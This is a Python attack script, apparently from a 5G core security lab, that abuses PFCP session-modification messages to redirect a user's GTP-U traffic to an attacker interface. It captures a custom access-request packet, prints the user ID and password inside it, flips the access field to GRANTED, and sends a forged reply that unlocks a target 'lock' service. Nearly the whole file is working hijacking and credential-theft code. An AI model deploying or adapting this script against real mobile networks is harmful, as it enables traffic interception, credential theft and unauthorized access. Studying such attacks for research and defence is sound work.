import sys

sys.path.insert(1, "../PFCP")

from PFCP_packet_sender import PFCP_sender

from scapy.all import sendp, send, Packet, hexdump, Ether, BitField, IP, ICMP, bind_layers, BitEnumField, get_if_addr, sniff
from threading import Thread, Event
import os
import sys
import time
import sys, getopt
from scapy.contrib.gtp import *
from Lock_data import Lock_server_ip, Lock_ue

class Key(Packet):
    name="Key"
    fields_desc= [BitEnumField(name="Access", default=2, size=2, enum={0:"DENIED", 1: "GRANTED", 2: "REQUEST"}), BitField(name="User_ID", default=0, size=6), BitField(name="User_Password", default=0, size=8)]

bind_layers(IP, Key, proto=2)
bind_layers(Ether, IP, type=0x800)

attacker_iface="uesimtun0"
src_ip=get_if_addr(attacker_iface)

on=Event()
pfcp=PFCP_sender(source_ip=None, destination_ips=None)
pfcp.print_packets=1
seid=0
gnb_ip="10.0.2.15"

def send_to_me():
    global seid
    pfcp.send_to=pfcp.source_ip
    pfcp.targeted_session_eavesdrop_modification_request(seid=seid)    
        
def send_to_lock():
    global seid
    global gnb_ip
    pfcp.send_to=pfcp.gnb_ip
    pfcp.targeted_session_eavesdrop_modification_request(seid=seid)        
        

def handle_packet(pkt):
    global src_ip
    if Key in pkt[IP] and not pkt[IP].src==src_ip and GTP_U_Header in pkt[IP]:
        pkt.show()
        ID=pkt[IP][Key].User_ID
        password=pkt[IP][Key].User_Password
        print(ID, password)
        key=pkt[IP][Key]
        key.Access=1
        send_to_lock()
        src_ip=get_if_addr(attacker_iface)
        resp_ip=IP(src=src_ip, dst=pkt[IP][GTP_U_Header][GTPPDUSessionContainer][IP].dst)
        resp=resp_ip/key
        sendp(resp, iface=attacker_iface)
        send_to_me()

def sniffer(on):
    #print (Lock_server_ip)
    sniff(iface=attacker_iface, prn=handle_packet, filter="ip", stop_filter= lambda x:on.is_set())
    print ("Ended.")


def main(argv):
    lock_iface=Lock_ue

    ue_ip=get_if_addr(lock_iface)
    


    

    global seid
    upf_ip=None
    opts, args =getopt.getopt(argv, 's:u:h:')
    for opt, arg in opts:
        if opt=='-s':
            seid=int(arg)
        if opt=='-u':
            upf_ip=arg
            pfcp.destination_ips=[upf_ip]
        if opt=='-h':
            print ('sudo python3 pfcp_lock_picker.py -s seid -u upf_ip')
            sys.exit()
    
    send_to_me()
    thread=Thread(target=sniffer, args=(on,))
    thread.start()
    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            on.set()
            break
    thread.join()

if __name__ =="__main__":
        main(sys.argv[1:])

